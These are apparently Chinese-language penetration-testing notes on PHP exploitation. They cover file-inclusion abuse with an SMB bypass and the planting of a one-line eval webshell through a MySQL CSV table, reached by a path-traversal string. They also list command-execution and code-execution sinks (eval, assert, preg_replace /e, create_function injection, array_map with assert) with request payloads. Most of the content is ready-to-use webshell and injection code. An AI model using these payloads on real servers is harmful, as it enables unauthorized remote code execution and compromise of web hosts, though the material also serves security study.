# php开启临时服务器

```bash
php -S 0.0.0.0:80 /path
```

# php文件包含利用

## 文件包含函数

用于引入外部代码，减少代码冗余

include()、include_once()：运行到那一行才引入，遇到错误继续下一行

require()、require_once()：先引入整合进代码，遇到错误停止程序

> _once：只引入一次

默认情况下allow_url_include=off，不允许引入外部文件

但存在一种特殊情况，windows可以通过SMB文件共享来绕过allow_url_include，文件包含时通过SMB共享文件来包含

## 利用mysql用户名密码写入一句话木马

> 爆破不出密码就尝试找其他文件上传漏洞

> 以下命令在mysql命令行环境中执行

### 查询数据库数据存储路径

```
select @@datadir
```

结果如：`D:\MySQL\data\`

### 选择数据库

- 查看数据库列表`select databases;`
- 选中有权限的数据库`use 数据库名`

### 创建表，将一句话木马作为字段名写入

```sql
create table if not exists `t`(`a` varchar(255) not null)engine=csv;
insert into t value('<?php eval($GET[8]);?>')
```

最后需要找到可控的引入点，将`D:\MySQL\data\数据库名\t.CSV`引入

绝对路径行不通的话可以尝试下相对路径`asdjfasdasdf/../../../../../../../../MySQL/data/数据库名/t.CSV`

# php系统命令执行函数

- `system('tasklist')`执行命令输出结果
- `passthru('netstat -ano')`执行命令输出结果
- `exec('cd ../../../&echo 1 > 1.php')`只能得到结果最后一行
- `shell_exec('systeminfo')`exce升级版，可以得到全部结果
- ```php
  //``是shell_exce的另一种写法，shell_exec被禁用``就用不了
  `whoami`;
  ``` 
- ```php
  //执行命令，并返回进程文件指针
  $f = popen('whoami','r');
  //读取文件,直到文件末尾（EOF）出现
  while(!feof($f)){
      echo fread($a,8192);
  }
  ```
  
php系统命令函数还有很多...

# php能执行代码的函数

## `eval`

**可执行多行代码**

```php
//eval('echo 123;phpinfo();');
eval($_GET[8]);
```

## `assert`

**只能执行单行代码**

```php
//assert('phpinfo()');
assert($_GET[8]);
```

嵌套eval，实现多行代码执行

发起请求：`http://xxx.com/xxx?8=eval('echo 123;phpinfo();')`

## `preg_replace(正则,替换为,原文本)`

**正则使用参数`/e`时修饰符存在代码执行漏洞，但必须真实发生替换才会触发代码执行**

```php
preg_replace('/a/e',$_GET[8],'a');
```

## `create_function(形参,函数体)`

```php
$f = create_function('$param','echo $param;');
// 以上等价于
function f ($param){echo $param;}
```

  
```php
$f = create_function('',$_GET[8]);
```

发起请求：`http://xxx.com/xxx?8=}phpinfo();//`

> `}`闭合函数体 | 执行代码 | `//`注释后面生成的`}`

结果将变成

function f(){ **}phpinfo();//** }


## `array_map(回调函数,待处理数组)`

**遍历处理数组**

> 能传回调函数的php自带函数都可以试试，不一定要array_map

```php
// 将每个请求参数的值依次传入`assert()`当做一行代码执行
array_map('assert',$_REQUEST);
```

## `"${phpinfo()}"`

**字符串变量解析**

> `php版本需大于5.5`

```php
$a = "${eval($_GET[8])}";
```



